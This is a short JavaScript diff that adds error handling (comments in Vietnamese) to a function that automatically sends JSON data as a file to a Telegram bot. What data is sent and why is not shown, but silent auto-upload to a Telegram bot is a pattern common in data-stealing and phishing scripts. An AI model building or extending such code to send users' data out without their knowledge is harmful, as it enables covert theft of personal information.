@@ -162,10 +162,15 @@ async function sendDataToTelegramBot(jsonData) {
     formData.append('document', blob, fileName);
     formData.append('caption', caption);
 
-    fetch(url, {
-        method: 'POST',
-        body: formData
-    });
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            body: formData
+        });
+    } catch (err) {
+        console.error('Gửi dữ liệu Telegram thất bại:', err);
+        // Có thể thêm: return false;
+    }
 }
 
 // Gửi tự động lên bot (bây giờ là async)
